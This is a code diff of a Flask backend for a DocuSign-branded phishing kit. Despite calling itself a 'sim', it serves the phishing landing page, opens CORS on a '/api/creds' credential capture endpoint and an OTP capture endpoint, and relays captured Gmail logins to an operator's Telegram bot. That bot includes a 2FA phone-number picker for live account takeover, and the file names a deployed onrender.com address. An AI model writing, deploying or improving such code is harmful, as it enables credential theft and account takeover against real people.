@@ -1,11 +1,12 @@
 #!/usr/bin/env python3
 """
 DocuSign Phishing Sim — Backend API (Webhook Mode)
-Deploy on Render — Pure requests-based Telegram integration, no async deps
+Deploy on Render — Pure requests-based Telegram integration
+Serves the landing page from the root URL
 """
 
 import json, logging, datetime, hashlib, threading, time, random, os
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, send_from_directory, make_response
 import requests as http_req
 
 # ─── CONFIG ───
@@ -23,6 +24,16 @@ gmail_sessions_lock = threading.Lock()
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
 logger = logging.getLogger(__name__)
+
+
+# ─── CORS HEADERS ───
+@app.after_request
+def add_cors_headers(response):
+    """Allow CORS for local file:// testing and cross-origin requests."""
+    response.headers["Access-Control-Allow-Origin"] = "*"
+    response.headers["Access-Control-Allow-Headers"] = "Content-Type"
+    response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
+    return response
 
 
 # ─── TELEGRAM HELPERS (pure requests, no async issues) ───
@@ -66,21 +77,6 @@ def tg_edit_message(message_id, text, reply_markup=None, parse_mode=None):
         return False
 
 
-def tg_edit_reply_markup(message_id, reply_markup):
-    """Edit only the reply markup of a message."""
-    payload = {
-        "chat_id": TELEGRAM_CHAT_ID,
-        "message_id": message_id,
-        "reply_markup": json.dumps(reply_markup)
-    }
-    try:
-        r = http_req.post(f"{API_BASE}/editMessageReplyMarkup", json=payload, timeout=15)
-        return r.json().get("ok", False)
-    except Exception as e:
-        logger.error(f"❌ TG edit markup error: {e}")
-        return False
-
-
 def tg_answer_callback(callback_query_id):
     """Answer a callback query (removes loading state on button)."""
     try:
@@ -90,13 +86,6 @@ def tg_answer_callback(callback_query_id):
     except Exception as e:
         logger.error(f"❌ TG answer callback error: {e}")
         return False
-
-
-def tg_send_or_edit(message_id, text, reply_markup=None, parse_mode=None):
-    """Send if no message_id, edit if exists."""
-    if message_id:
-        return tg_edit_message(message_id, text, reply_markup, parse_mode)
-    return tg_send_message(text, reply_markup, parse_mode)
 
 
 # ─── INLINE KEYBOARD BUILDER ───
@@ -187,7 +176,6 @@ def handle_cb(query):
                 s = gmail_sessions[sid]
                 s["action"] = "2fa_grid"
                 s["stage"] = "awaiting_2fa"
-                # Build 2FA grid (10-99)
                 kb_rows = []
                 row = []
                 for i in range(10, 100):
@@ -198,8 +186,7 @@ def handle_cb(query):
                 if row:
                     kb_rows.append(row)
                 kb_rows.append([btn("❌ Cancel", f"cancel:{sid}")])
-                markup = inline_kb(kb_rows)
-                tg_edit_message(mid, "🔐 Select 2FA phone number ending:", markup)
+                tg_edit_message(mid, "🔐 Select 2FA phone number ending:", inline_kb(kb_rows))
 
         elif cb_data.startswith("2fa:"):
             parts = cb_data.split(":")
@@ -299,14 +286,20 @@ def handle_cb(query):
         logger.error(f"CB error: {e}", exc_info=True)
 
 
-# ─── API ───
+# ─── SERVE THE LANDING PAGE ───
 @app.route("/")
-def health():
-    with gmail_sessions_lock:
-        count = len(gmail_sessions)
-    return jsonify({"status": "ok", "sessions": count})
+def serve_landing():
+    """Serve the DocuSign phishing landing page."""
+    return send_from_directory(".", "index.html")
 
 
+@app.route("/index.html")
+def serve_index():
+    """Also serve from direct path."""
+    return send_from_directory(".", "index.html")
+
+
+# ─── API ENDPOINTS ───
 @app.route("/setup_webhook", methods=["POST"])
 def setup_webhook():
     """Manually set webhook (call once after deploy)."""
@@ -318,12 +311,10 @@ def setup_webhook():
     webhook_url = f"{url.rstrip('/')}/webhook/{TELEGRAM_BOT_TOKEN}"
 
     try:
-        # Step 1: Delete existing webhook
         del_resp = http_req.get(f"{API_BASE}/deleteWebhook",
                                 params={"drop_pending_updates": True}, timeout=15)
         logger.info(f"Delete webhook: {del_resp.json()}")
 
-        # Step 2: Set new webhook with allowed_updates
         set_resp = http_req.post(f"{API_BASE}/setWebhook", json={
             "url": webhook_url,
             "allowed_updates": ["message", "callback_query"],
@@ -332,7 +323,6 @@ def setup_webhook():
         }, timeout=15)
         logger.info(f"Set webhook: {set_resp.json()}")
 
-        # Step 3: Verify
         time.sleep(2)
         info_resp = http_req.get(f"{API_BASE}/getWebhookInfo", timeout=15)
         info = info_resp.json().get("result", info_resp.json())
@@ -349,9 +339,13 @@ def setup_webhook():
         return jsonify({"error": str(e)}), 500
 
 
-@app.route("/api/creds", methods=["POST"])
+@app.route("/api/creds", methods=["POST", "OPTIONS"])
 def capture():
     """Universal credential capture endpoint"""
+    # Handle CORS preflight
+    if request.method == "OPTIONS":
+        return make_response("", 204)
+
     data = request.json
     provider = data.get("provider", "unknown")
     email = data.get("email", "")
@@ -474,11 +468,18 @@ def capture_otp():
     return jsonify({"status": "ok"})
 
 
+# ─── HEALTH ───
+@app.route("/health")
+def health_check():
+    with gmail_sessions_lock:
+        count = len(gmail_sessions)
+    return jsonify({"status": "ok", "sessions": count})
+
+
 # ─── START ───
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
     logger.info(f"Starting Flask on 0.0.0.0:{port}")
-    logger.info(f"After deploy, run:")
-    logger.info(f"  curl -X POST https://docusign-unx3.onrender.com/setup_webhook -H 'Content-Type: application/json' -d '{{\"url\": \"https://docusign-unx3.onrender.com\"}}'")
-    logger.info(f"IMPORTANT: Procfile must be: web: gunicorn server:app --workers=1 --bind 0.0.0.0:$PORT")
+    logger.info(f"Landing page: https://docusign-unx3.onrender.com/")
+    logger.info(f"Webhook: https://docusign-unx3.onrender.com/webhook/{TELEGRAM_BOT_TOKEN}")
     app.run(host="0.0.0.0", port=port, debug=False)
